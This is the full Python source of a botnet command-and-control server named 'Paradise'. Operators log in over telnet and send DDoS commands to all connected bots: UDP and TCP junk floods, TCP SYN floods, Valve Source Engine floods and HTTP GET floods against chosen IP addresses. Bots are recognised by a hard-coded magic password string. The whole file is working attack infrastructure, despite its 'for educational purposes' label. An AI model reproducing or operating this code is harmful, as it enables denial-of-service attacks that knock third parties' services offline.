#!/usr/bin/env python3
#-*- coding: utf-8 -*-
# CNC Server
#    ___       ___       ___       ___       ___       ___       ___       ___   
#   /\  \     /\  \     /\  \     /\  \     /\  \     /\  \     /\  \     /\  \  
#  /::\  \   /::\  \   /::\  \   /::\  \   /::\  \   _\:\  \   /::\  \   /::\  \ 
# /::\:\__\ /::\:\__\ /::\:\__\ /::\:\__\ /:/\:\__\ /\/::\__\ /\:\:\__\ /::\:\__\
# \/\::/  / \/\::/  / \;:::/  / \/\::/  / \:\/:/  / \::/\/__/ \:\:\/__/ \:\:\/  /
#    \/__/    /:/  /   |:\/__/    /:/  /   \::/  /   \:\__\    \::/  /   \:\/  / 
#             \/__/     \|__|     \/__/     \/__/     \/__/     \/__/     \/__/  

# Libraries
import socket, threading, sys, time, ipaddress
from colorama import Fore, init

about = """
    ┌────────────────────────────┐
    │ * Author : D3fe4ted        │
    │ * Coded in Python          │
    │ * For educational purposes │
    └────────────────────────────┘
"""

help = """
    ┌───────────────────────────────────────┐
    │ HELP: Shows list of commands          │
    │ METHODS: Shows list of attack methods │
    │ CLEAR: Clears the screen              │
    │ LOGOUT: Disconnects from the net      │
    └───────────────────────────────────────┘
"""

methods = """
    ┌───────────┬──────────────────────────────┐
    │  Methods  │          Description         │
    ├───────────┼──────────────────────────────┤
    │ * .udp    │  UDP Junk Flood              │
    │ * .tcp    │  TCP Junk Flood              │
    │ * .tcpsyn │  TCP SYN Flood               │
    │ * .vse    │  Valve Source Engine Flood   │
    │ * .http   │  HTTP GET Request Flood      │
    └───────────┴──────────────────────────────┘
"""

bots = {}
ansi_clear = '\033[2J\033[H'

banner = """Welcome to Paradise. Enjoy your stay!\n"""

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

# Read credentials from login file
def find_login(username, password):
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

# Check if all bots are still connected to C2
def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

# Updates Shell Title
def update_title(client, username):
    while 1:
        try:
            send(client, f'\33]0;Paradise | Boats: {len(bots)} | Logged in as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()

# Telnet Command Line
def command_line(client):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'{Fore.LIGHTBLUE_EX}Paradise {Fore.LIGHTWHITE_EX}$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'ABOUT':
                send(client, about)
            if command == 'HELP':
                send(client, help)
            elif command == 'METHODS':
                send(client, methods)
            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)
            elif command == 'LOGOUT':
                send(client, '* Successfully Logged out\n')
                time.sleep(1)
                break
            
            # VSE Flood
            elif command == '.VSE':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')

            # TCP-SYN flood           
            elif command == '.SYN':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')
                    
            # TCP Junk (Random TCP Data)
            elif command == '.TCP':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')

            # UDP Junk (Random UDP Data)
            elif command == '.UDP':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')
                    send(client, 'Use port 0 for random port mode')

            # HTTP GET Flood
            elif command == '.HTTP':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if validate_ip(ip):
                        if validate_time(secs):
                            send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .http [IP] [TIME]')
            else:
                send(client, Fore.RED + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()

# Username login
def handle_client(client, address):
    send(client, f'\33]0;Paradise | Login\a', False)
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # Password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip(): 
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})
    
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python3 {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # Start keepalive thread

    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
